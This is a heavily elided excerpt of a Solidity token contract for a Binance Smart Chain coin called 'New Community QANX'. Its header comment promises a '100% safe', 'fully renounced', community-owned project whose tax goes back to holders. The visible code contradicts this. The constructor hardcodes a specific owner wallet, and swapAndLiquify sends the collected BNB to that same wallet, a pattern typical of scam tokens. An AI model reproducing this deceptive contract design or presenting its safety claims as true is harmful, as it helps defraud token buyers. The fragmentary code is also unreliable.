...
/**
New Community QANX is a Community-owned, 100% safe crypto project deployed on Binance Smart Chain (BSC).
Our contract is fully renounced, we have low tax and it's go back into the ecosystem as instant rewards.

Also it's Catcoin Fork
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0xF1c8003BABe23Ef564e18F331d6e8Af56D6fee0c;
...
contract NewCommunityQANX is Context, IERC20, Ownable { 
    ...
    string private constant _symbol = "NCQanx"; 
 ...
 function _transfertoken(address sender, address rcp, uint256 tAmount) private {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0xF1c8003BABe23Ef564e18F331d6e8Af56D6fee0c), BNB_Tot);
            }
